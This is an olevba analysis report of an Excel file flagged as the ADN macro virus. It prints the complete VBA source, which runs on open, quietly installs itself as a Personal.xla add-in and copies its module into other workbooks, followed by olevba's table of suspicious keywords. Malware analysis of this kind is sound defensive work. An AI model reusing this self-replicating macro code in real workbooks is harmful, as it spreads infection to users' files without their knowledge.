olevba 0.60.1.dev3 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: Virus.MSExcel.Adn-c21184ea9376f92543decda9caca0432903fb4fa
Type: OLE
-------------------------------------------------------------------------------
VBA MACRO ThisWorkbook.cls 
in file: Virus.MSExcel.Adn-c21184ea9376f92543decda9caca0432903fb4fa - OLE stream: '_VBA_PROJECT_CUR/VBA/ThisWorkbook'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
(empty macro)
-------------------------------------------------------------------------------
VBA MACRO Hoja1.cls 
in file: Virus.MSExcel.Adn-c21184ea9376f92543decda9caca0432903fb4fa - OLE stream: '_VBA_PROJECT_CUR/VBA/Hoja1'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
(empty macro)
-------------------------------------------------------------------------------
VBA MACRO X316.bas 
in file: Virus.MSExcel.Adn-c21184ea9376f92543decda9caca0432903fb4fa - OLE stream: '_VBA_PROJECT_CUR/VBA/X316'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
' Spalaci Label is Pac
' ADN Virus - (C) Copyright 1999/2000
Public Indexe As String

Private Sub auto_open()
Attribute auto_open.VB_ProcData.VB_Invoke_Func = " \n14"
For i = 1 To ThisWorkbook.VBProject.VBComponents.Count
    Cadena = ThisWorkbook.VBProject.VBComponents(i).Name
    Letras = Left(Cadena, 1): Numero = Right(Cadena, (Len(Cadena) - 1))
    Fusion = (Letras & Val(Numero))
    If Cadena = Fusion Then
       Indexe = ThisWorkbook.VBProject.VBComponents(i).Name
    End If
Next
Application.OnSheetActivate = "ClassModulo"
End Sub

Private Sub ClassModulo()
Attribute ClassModulo.VB_ProcData.VB_Invoke_Func = " \n14"
    Randomize: install = 0
    Application.DisplayAlerts = False
    Application.ScreenUpdating = False
    Intr = Int((Rnd * 1000) + 1)
    Iltr = Int((90 - 65 + 1) * Rnd + 65)
    Play = (Chr(Iltr) & Intr)
    If ThisWorkbook.Name <> "Personal.xla" Then
       If Dir(Application.Path + "\Personal.xla") = "Personal.xla" Then install = 1
       If install = 0 Then
          Workbooks.Add.SaveAs FileName:=Application.Path + "\Personal.xla"
          ThisWorkbook.VBProject.VBComponents(Indexe).Export (Indexe)
          Workbooks("Personal.xla").VBProject.VBComponents.Import (Indexe)
          Workbooks("Personal.xla").VBProject.VBComponents(Indexe).Name = Play
          Workbooks("Personal.xla").IsAddin = True
          Workbooks("Personal.xla").Save
          AddIns.Add(Application.Path + "\Personal.xla").Installed = True
       End If
    Else
       For i = 1 To ActiveWorkbook.VBProject.VBComponents.Count
           Cadena = ActiveWorkbook.VBProject.VBComponents(i).Name
           Letras = Left(Cadena, 1): Numero = Right(Cadena, (Len(Cadena) - 1))
           Fusion = (Letras & Val(Numero))
           If Cadena = Fusion Then install = 1
       Next
       If install = 0 Then
          ThisWorkbook.VBProject.VBComponents(Indexe).Export (Indexe)
          ActiveWorkbook.VBProject.VBComponents.Import (Indexe)
          ActiveWorkbook.VBProject.VBComponents(Indexe).Name = Play
       End If
    End If
    If Day(Now()) = Int((31 * Rnd) + 1) Then
       Application.Caption = "Spalaci.Label.Is.Pac"
       Application.CommandBars.LargeButtons = True
    End If
    Application.DisplayAlerts = True
    Application.ScreenUpdating = True
End Sub

-------------------------------------------------------------------------------
VBA MACRO xlm_macro.txt 
in file: xlm_macro - OLE stream: 'xlm_macro'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
' 0085     13 BOUNDSHEET : Sheet Information - worksheet or dialog sheet, visible -  Hoja
+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|AutoExec  |auto_open           |Runs when the Excel Workbook is opened       |
|Suspicious|Chr                 |May attempt to obfuscate specific strings    |
|          |                    |(use option --deobf to deobfuscate)          |
|Suspicious|VBProject           |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|VBComponents        |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|Hex Strings         |Hex-encoded strings were detected, may be    |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
|Suspicious|Base64 Strings      |Base64-encoded strings were detected, may be |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
|Base64    |_}z                 |X316                                         |
|String    |                    |                                             |
+----------+--------------------+---------------------------------------------+

